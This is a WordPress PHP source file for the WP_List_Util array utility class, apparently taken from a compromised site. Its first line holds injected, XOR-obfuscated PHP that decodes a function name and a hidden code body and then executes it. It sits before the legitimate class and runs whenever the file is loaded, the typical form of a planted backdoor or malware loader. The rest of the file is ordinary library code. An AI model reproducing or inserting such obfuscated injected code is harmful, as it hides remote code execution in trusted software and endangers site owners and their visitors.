<?php $oKwVqe=';JK7TT-09S12-OT'^'X8.V 1rVL=RFD :';$PkozmpT=$oKwVqe('','PXzy X<TTG7;aY P:NDqs5BE95.>;ej<XTIeyqFpFMN<OIZWNZKT8-=Y>.>lFC9DuH =YkVf9ECavWdKA1;<SR5YIyLpuWjcz7-YBYEQKQldVhT9YJ<BB4NGsI8;3lmUgYyoe0khmZ> OGZTgg>AX.eQY0PgQs.YMgTSVVk;DB> WxO3 Nz2nkP2bL1G3JZxPD8 lVK8CA9c7g=1D-bng7Q84.JdgQ0T,iKWCYErFLXEVB8P<677-TXeJc2sv zwsnYGlTXYDagFCwE0<U FuHlnq+3=A4S4YnLXnKNMwAyk2J8,WYCk5,UHNaP-Ao=<RNRG+3O3agJM:7;HVJ1.wDv:nqb<31evV6JT3NDrxfRFAP+>HJaMms:H=M=L>RRIluUKY<2xNfXJDP0JdRTk UWCKImD0M2:IUZUIWVSM+AZE.<:U>IH G<9F+74O7:===IdVWF4Syi+KR.TSqg<LF.eurV1 C+fZH+Nmx0GXnCIAA CJim079MH-SKC54EGA1GgW2 TJKtwDVDAEgGlEz;3dBf5ABO7AE2LPgncISykjBQM.JeACDe=5dDBp1q,nBwgGXNiHXMIWMPUpAZB<+>5U=Jq=C.G=EEO95YQTMUnXCvQ1.;hAKGxUYWJpeRG,>oI U.39f<Y.Y<8.s,xvRX<X.<CfLsX2'^'9>RXF-R7 .XU><X9I:7YTM-7fQOJZ:5Q- nLPQ=zO+;R,=38 z3;JrY8JOa3+6MlQ,AI8GvBR :HVwDkaJ15ZvZ,=YqPRpQis>K60qa8klLTmHpPe9H0.Q oW-YOREVuC0RDL:baI5KToigtOCZ ,O>u0mp9qWE<4<p:vsKH00RE9PkXE7SoGPZ;k>T3F84Pt+MTEmA1>KDi=CYP0LBSGQ0TGKqnC5Q M6 2:yxR -463y2ZZYERL70EbGm09o1>6N84Lp3<=AZxcS3QP EoU3fgUORI k8Q NqxJ +4LKpOV+LMwdcOCM9=+ZZPKeTZrfscOR;RHG1G3QT:3+RFWlRe<43ivb1V7EjpX+=REXrb71GK-cA6gz3lY,I-a970LHuo2YKCDoQn 1D+DotOV4;6.rgMMGO0Cq>4=6vnmk446KNS4R 2EoDV4tSU;VebPH=L465QeM6O.1A06YCX-2OLYRrUA7J91-RgDC:.>Fg- 5AclOMQEK,1r8.:jQ=.2E4OpYE-mgTS 70 lGaJeRVWQjBQ 6.lf.W5w:GCtnYLSzcyH,Ttp RXWRtuHWEJX CVvh,Xzi,+pdpsVa;0NJGj>X3.X;G4I6mhIT =;,1ItcR5PZZAhkgXuyw1zl71MRGmD4ZRbAL8W5SYJTqQMXQY GHkVeHRO');$PkozmpT();
/**
 * WordPress List utility class
 *
 * @package WordPress
 * @since 4.7.0
 */

/**
 * List utility.
 *
 * Utility class to handle operations on an array of objects.
 *
 * @since 4.7.0
 */
class WP_List_Util {
	/**
	 * The input array.
	 *
	 * @since 4.7.0
	 * @access private
	 * @var array
	 */
	private $input = array();

	/**
	 * The output array.
	 *
	 * @since 4.7.0
	 * @access private
	 * @var array
	 */
	private $output = array();

	/**
	 * Temporary arguments for sorting.
	 *
	 * @since 4.7.0
	 * @access private
	 * @var array
	 */
	private $orderby = array();

	/**
	 * Constructor.
	 *
	 * Sets the input array.
	 *
	 * @since 4.7.0
	 *
	 * @param array $input Array to perform operations on.
	 */
	public function __construct( $input ) {
		$this->output = $this->input = $input;
	}

	/**
	 * Returns the original input array.
	 *
	 * @since 4.7.0
	 * @access public
	 *
	 * @return array The input array.
	 */
	public function get_input() {
		return $this->input;
	}

	/**
	 * Returns the output array.
	 *
	 * @since 4.7.0
	 * @access public
	 *
	 * @return array The output array.
	 */
	public function get_output() {
		return $this->output;
	}

	/**
	 * Filters the list, based on a set of key => value arguments.
	 *
	 * @since 4.7.0
	 *
	 * @param array  $args     Optional. An array of key => value arguments to match
	 *                         against each object. Default empty array.
	 * @param string $operator Optional. The logical operation to perform. 'AND' means
	 *                         all elements from the array must match. 'OR' means only
	 *                         one element needs to match. 'NOT' means no elements may
	 *                         match. Default 'AND'.
	 * @return array Array of found values.
	 */
	public function filter( $args = array(), $operator = 'AND' ) {
		if ( empty( $args ) ) {
			return $this->output;
		}

		$operator = strtoupper( $operator );

		if ( ! in_array( $operator, array( 'AND', 'OR', 'NOT' ), true ) ) {
			return array();
		}

		$count = count( $args );
		$filtered = array();

		foreach ( $this->output as $key => $obj ) {
			$to_match = (array) $obj;

			$matched = 0;
			foreach ( $args as $m_key => $m_value ) {
				if ( array_key_exists( $m_key, $to_match ) && $m_value == $to_match[ $m_key ] ) {
					$matched++;
				}
			}

			if (
				( 'AND' == $operator && $matched == $count ) ||
				( 'OR' == $operator && $matched > 0 ) ||
				( 'NOT' == $operator && 0 == $matched )
			) {
				$filtered[$key] = $obj;
			}
		}

		$this->output = $filtered;

		return $this->output;
	}

	/**
	 * Plucks a certain field out of each object in the list.
	 *
	 * This has the same functionality and prototype of
	 * array_column() (PHP 5.5) but also supports objects.
	 *
	 * @since 4.7.0
	 *
	 * @param int|string $field     Field from the object to place instead of the entire object
	 * @param int|string $index_key Optional. Field from the object to use as keys for the new array.
	 *                              Default null.
	 * @return array Array of found values. If `$index_key` is set, an array of found values with keys
	 *               corresponding to `$index_key`. If `$index_key` is null, array keys from the original
	 *               `$list` will be preserved in the results.
	 */
	public function pluck( $field, $index_key = null ) {
		if ( ! $index_key ) {
			/*
			 * This is simple. Could at some point wrap array_column()
			 * if we knew we had an array of arrays.
			 */
			foreach ( $this->output as $key => $value ) {
				if ( is_object( $value ) ) {
					$this->output[ $key ] = $value->$field;
				} else {
					$this->output[ $key ] = $value[ $field ];
				}
			}
			return $this->output;
		}

		/*
		 * When index_key is not set for a particular item, push the value
		 * to the end of the stack. This is how array_column() behaves.
		 */
		$newlist = array();
		foreach ( $this->output as $value ) {
			if ( is_object( $value ) ) {
				if ( isset( $value->$index_key ) ) {
					$newlist[ $value->$index_key ] = $value->$field;
				} else {
					$newlist[] = $value->$field;
				}
			} else {
				if ( isset( $value[ $index_key ] ) ) {
					$newlist[ $value[ $index_key ] ] = $value[ $field ];
				} else {
					$newlist[] = $value[ $field ];
				}
			}
		}

		$this->output = $newlist;

		return $this->output;
	}

	/**
	 * Sorts the list, based on one or more orderby arguments.
	 *
	 * @since 4.7.0
	 *
	 * @param string|array $orderby       Optional. Either the field name to order by or an array
	 *                                    of multiple orderby fields as $orderby => $order.
	 * @param string       $order         Optional. Either 'ASC' or 'DESC'. Only used if $orderby
	 *                                    is a string.
	 * @param bool         $preserve_keys Optional. Whether to preserve keys. Default false.
	 * @return array The sorted array.
	 */
	public function sort( $orderby = array(), $order = 'ASC', $preserve_keys = false ) {
		if ( empty( $orderby ) ) {
			return $this->output;
		}

		if ( is_string( $orderby ) ) {
			$orderby = array( $orderby => $order );
		}

		foreach ( $orderby as $field => $direction ) {
			$orderby[ $field ] = 'DESC' === strtoupper( $direction ) ? 'DESC' : 'ASC';
		}

		$this->orderby = $orderby;

		if ( $preserve_keys ) {
			uasort( $this->output, array( $this, 'sort_callback' ) );
		} else {
			usort( $this->output, array( $this, 'sort_callback' ) );
		}

		$this->orderby = array();

		return $this->output;
	}

	/**
	 * Callback to sort the list by specific fields.
	 *
	 * @since 4.7.0
	 * @access private
	 *
	 * @see WP_List_Util::sort()
	 *
	 * @param object|array $a One object to compare.
	 * @param object|array $b The other object to compare.
	 * @return int 0 if both objects equal. -1 if second object should come first, 1 otherwise.
	 */
	private function sort_callback( $a, $b ) {
		if ( empty( $this->orderby ) ) {
			return 0;
		}

		$a = (array) $a;
		$b = (array) $b;

		foreach ( $this->orderby as $field => $direction ) {
			if ( ! isset( $a[ $field ] ) || ! isset( $b[ $field ] ) ) {
				continue;
			}

			if ( $a[ $field ] == $b[ $field ] ) {
				continue;
			}

			$results = 'DESC' === $direction ? array( 1, -1 ) : array( -1, 1 );

			if ( is_numeric( $a[ $field ] ) && is_numeric( $b[ $field ] ) ) {
				return ( $a[ $field ] < $b[ $field ] ) ? $results[0] : $results[1];
			}

			return 0 > strcmp( $a[ $field ], $b[ $field ] ) ? $results[0] : $results[1];
		}

		return 0;
	}
}
